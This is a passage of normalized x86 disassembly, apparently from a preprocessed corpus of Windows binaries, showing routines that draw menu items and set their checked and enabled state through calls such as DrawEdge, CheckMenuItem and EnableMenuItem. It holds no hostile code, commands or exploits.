cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44aabc
cmp ebx eax
jl r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41ed94
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41e644
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_41e64c
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41e64c
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41e9f0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41e644
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_425100
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41e620
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41e9f0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41e9f0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_422f14
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_44ec73
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_42405c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_41de80
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44aabc
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41e64c
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_44dcd0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x5c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_41e14c
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41ed94
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41eb74
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44afd4
jmp r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41ed94
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_41e944
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_41de80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403124
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_44dcd0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f137
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_44cd94
mov eax [ ebp + 0x8 ]
mov [ eax - 0x20 ] 0xa
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ ebp - 0x4 ]
call sub_41ebf4
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ ebp - 0x4 ]
call sub_44dcd0
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_44f284
push ebx
xor ebx ebx
mov edx [ eax + 0x64 ]
jmp r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
cmp [ edx + 0x7c ] 0x0
je r-xdata
call sub_44fc68
test eax eax
je r-xdata
mov ebx [ edx + 0x7c ]
jmp r-xdata
mov edx [ edx + 0x64 ]
mov eax ebx
pop ebx
retn
mov ebx [ eax + 0x48 ]
sub_44f2b4
push ebp
mov ebp esp
add esp 0xfffffeac
mov [ ebp - 0x154 ] 0x154
push 0x0
lea eax [ ebp - 0x154 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xbc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xb8 ]
mov [ eax ] edx
sub_44f300
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_44f4e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov si 0xfff2
call sub_403320
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
push ebp
call sub_44f2b4
pop ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x5
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffffe
xor eax eax
jmp r-xdata
mov eax edi
call sub_44fc68
mov esi eax
mov eax edi
call sub_44f284
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x30 ]
mov edx r-xdata
call sub_404304
jne r-xdata
cmp [ edi + 0x4c ] 0x0
je r-xdata
cmp [ edi + 0x40 ] 0xffffffff
jg r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffff9
xor eax eax
mov eax [ edi + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x10
test bl bl
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
lea eax [ ebp - 0x20 ]
xor ecx ecx
mov edx 0x10
call sub_402b40
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax ] 0x3
mov eax [ ebp - 0x4 ]
add [ eax ] 0xf
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x10
mov eax esi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov bl [ esi + 0x60 ]
jmp r-xdata
mov si [ edi + 0x60 ]
test si si
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_403f90
lea edx [ ebp - 0x24 ]
mov eax esi
call sub_44cd94
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_404204
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f4e9
lea eax [ ebp - 0x24 ]
call sub_403ef8
lea eax [ ebp - 0x10 ]
call sub_403ef8
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ edi + 0xa4 ]
call [ edi + 0xa0 ]
xor eax eax
mov al bl
mov ax [ eax * 2 + rw-data ]
or ax 0x40
or ax 0x20
or ax 0x100
or ax 0x400
movzx eax ax
lea edx [ ebp - 0x20 ]
push edx
push 0x0
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_44dcd0
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
add eax 0x7
mov edx [ ebp - 0x4 ]
add [ edx ] eax
cmp [ edi + 0xa2 ] 0x0
je r-xdata
sub_44f514
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx esi
call sub_404304
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_403f4c
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44f53c
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_44f6ac
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ eax + 0x3d ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x64 ]
call sub_44f6bc
cmp ebx eax
je r-xdata
mov dl [ eax + 0x3f ]
cmp dl [ ebx + 0x3f ]
jne r-xdata
xor edx edx
call sub_44f584
sub_44f584
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x38 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x38 ] bl
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
test bl bl
je r-xdata
test [ esi + 0x1c ] 0x2
jne r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_44dc40
push eax
call CheckMenuItem
mov eax esi
call sub_44f53c
sub_44f5d8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x39 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x39 ] bl
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov eax esi
call sub_44f6ac
test eax eax
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
test [ esi + 0x1c ] 0x2
jne r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_44dc40
push eax
call EnableMenuItem
sub_44f650
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x3f ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov [ esi + 0x3f ] bl
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_44fa10
mov edx eax
mov ecx ebx
mov eax edi
call sub_44dbe0
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov eax esi
call sub_44f53c
sub_44f6bc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_414108
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_44cce8
sub_44f72c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_44f6ac
test esi esi
jge r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax ebx
call sub_44f714
cmp esi eax
je r-xdata
mov esi eax
dec esi
mov edi [ ebx + 0x64 ]
mov edx ebx
mov eax edi
call sub_44fa44
mov ecx ebx
mov edx esi
mov eax edi
call sub_44f838
sub_44f774
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44f6ac
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44f6bc
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_44f7cc
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x3a ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ ebp + 0x3a ] bl
mov dl 0x1
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebp + 0x64 ] 0x0
je r-xdata
mov eax [ ebp + 0x64 ]
call sub_44f6ac
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_44f6bc
mov [ eax + 0x3a ] 0x0
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_44f6bc
cmp [ eax + 0x3a ] 0x0
je r-xdata
sub_44f838
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp [ esi + 0x64 ] 0x0
je r-xdata
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_44cce8
mov ebp edi
dec ebp
test ebp ebp
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebx + 0x5c ] eax
mov cl [ esi + 0x3f ]
mov edx edi
mov eax ebx
call sub_44dbe0
mov ecx esi
mov edx edi
mov eax [ ebx + 0x5c ]
call sub_414184
mov [ esi + 0x64 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x80 ] sub_44fab0
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax [ ebx + 0x5c ]
cmp ebp [ eax + 0x8 ]
jge r-xdata
mov eax ebx
call sub_44f6ac
dec eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44db10
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_414108
mov al [ eax + 0x3f ]
cmp al [ esi + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_414108
mov dl [ eax + 0x3f ]
mov eax esi
call sub_44f650
sub_44f8ec
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_44cce8
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax ebx
